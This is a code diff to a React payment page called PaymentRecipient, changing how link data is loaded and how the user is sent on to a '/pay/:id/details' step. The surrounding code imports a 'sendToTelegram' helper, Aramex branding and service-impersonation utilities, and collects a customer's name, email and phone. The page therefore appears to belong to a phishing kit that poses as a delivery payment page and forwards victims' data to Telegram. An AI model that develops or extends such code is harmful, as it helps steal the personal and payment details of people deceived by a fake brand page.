@@ -8,7 +8,7 @@ import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getServiceBrandingByType, getServiceTitle, getServiceIcon } from "@/lib/serviceBranding";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
-import { useLink } from "@/hooks/useLocalStorage";
+import { useLinkData, useLinkNavigation } from "@/hooks/useUrlBasedData";
 import { sendToTelegram } from "@/lib/telegram";
 import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
 import heroAramex from "@/assets/hero-aramex.jpg";
@@ -29,7 +29,8 @@ import heroBg from "@/assets/hero-bg.jpg";
 const PaymentRecipient = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData } = useLink(id);
+  const { linkData } = useLinkData();
+  const { navigateToDetails } = useLinkNavigation();
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
@@ -153,7 +154,9 @@ const PaymentRecipient = () => {
       service: serviceName,
       amount: formattedAmount
     }));
-    navigate(`/pay/${id}/details`);
+    if (linkData) {
+      navigate(navigateToDetails(id!, linkData));
+    }
   };
   
   return (
